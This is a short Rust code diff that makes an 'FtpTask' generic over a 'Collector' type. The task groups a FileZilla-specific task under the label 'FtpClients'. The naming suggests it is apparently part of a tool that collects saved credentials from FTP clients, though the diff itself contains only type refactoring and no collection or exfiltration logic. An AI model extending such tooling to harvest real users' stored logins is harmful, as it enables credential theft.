@@ -7,13 +7,14 @@ mod filezilla;
 use crate::filezilla::FileZillaTask;
 use alloc::borrow::ToOwned;
 use alloc::vec;
+use collector::Collector;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
 
-pub struct FtpTask {
-    inner: CompositeTask
+pub struct FtpTask<C: Collector> {
+    inner: CompositeTask<C>
 }
 
-impl FtpTask {
+impl<C: Collector> FtpTask<C> {
     pub fn new() -> Self {
         Self {
             inner: composite_task!(
@@ -23,4 +24,4 @@ impl FtpTask {
     }
 }
 
-impl_composite_task_runner!(FtpTask, "FtpClients");
+impl_composite_task_runner!(FtpTask<C>, "FtpClients");
